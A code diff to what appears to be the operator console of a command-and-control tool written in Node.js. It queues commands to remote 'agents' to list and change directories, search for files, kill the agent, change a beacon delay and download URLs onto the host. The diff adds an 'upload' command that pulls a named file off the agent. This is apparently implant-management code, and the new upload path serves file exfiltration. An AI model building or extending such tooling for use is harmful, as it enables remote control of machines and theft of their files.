@@ -35,9 +35,10 @@ function printUsage() {
               '       agent <ID> pwd\n' +
               '       agent <ID> cd <dir>\n' +
               '       agent <ID> kill\n' +
-              '       agent <ID> find <name> <location>\n' +
+              '       agent <ID> find <filename> <dir>\n' +
               '       agent <ID> delay <seconds>\n' +
-              '       agent <ID> download <url> <location>\n' +
+              '       agent <ID> download <url> [dir]\n' +
+              '       agent <ID> upload <filename>\n' +
               '       exit\n');
 }
 
@@ -107,11 +108,11 @@ rl.on('line', line => {
           }
 
           case 'find': {
-            const [name, location] = args.slice(2);
-            if (name == undefined || location == undefined) {
-              console.log('Usage: agent <ID> find <name> <location>');
+            const [name, dir] = args.slice(2);
+            if (name == undefined || dir == undefined) {
+              console.log('Usage: agent <ID> find <name> <dir>');
             } else if (id in agents) {
-              find(id, name, location);
+              find(id, name, dir);
             } else {
               error('An agent with that ID does not exist');
             }
@@ -131,11 +132,23 @@ rl.on('line', line => {
           }
 
           case 'download': {
-            const [url, location] = args.slice(2);
+            const [url, dir] = args.slice(2);
             if (url == undefined) {
-              console.log('Usage: agent <ID> download <url> <location>');
+              console.log('Usage: agent <ID> download <url> <dir>');
             } else if (id in agents) {
-              download(id, url, location);
+              download(id, url, dir);
+            } else {
+              error('An agent with that ID does not exist');
+            }
+            break;
+          }
+
+          case 'upload': {
+            const filename = args[2];
+            if (filename == undefined) {
+              console.log('Usage: agent <ID> upload <filename>');
+            } else if (id in agents) {
+              upload(id, filename);
             } else {
               error('An agent with that ID does not exist');
             }
@@ -186,25 +199,30 @@ function kill(id) {
   agents[id].queueCommand({ type: 'kill' });
 }
 
-function find(id, name, location) {
+function find(id, name, dir) {
   console.log(`Finding files matching ${name} on agent ${id}`);
-  agents[id].queueCommand({ type: 'find', data: { name, location } });
+  agents[id].queueCommand({ type: 'find', data: { name, dir } });
 }
 
 function setTime(id, seconds) {
-  console.log(`Changing wait time to ${seconds} on agent ${id}`);
+  console.log(`Changing delay to ${seconds} on agent ${id}`);
   agents[id].queueCommand({ type: 'delay', data: seconds });
 }
 
-function download(id, url, location) {
-  if (location == undefined) {
-    location = '';
+function download(id, url, dir) {
+  if (dir == undefined) {
+    dir = '';
     console.log(`Downloading ${url} to current working directory on agent ${id}`);
   } else {
-    console.log(`Downloading ${url} to ${location} on agent ${id}`);
+    console.log(`Downloading ${url} to ${dir} on agent ${id}`);
   }
 
-  agents[id].queueCommand({ type: 'download', data: { url, location } });
+  agents[id].queueCommand({ type: 'download', data: { url, dir } });
+}
+
+function upload(id, filename) {
+  console.log(`Uploading ${filename} from agent ${id}`);
+  agents[id].queueCommand({ type: 'upload', data: filename });
 }
 
 // ---------- express endpoints ---------- //
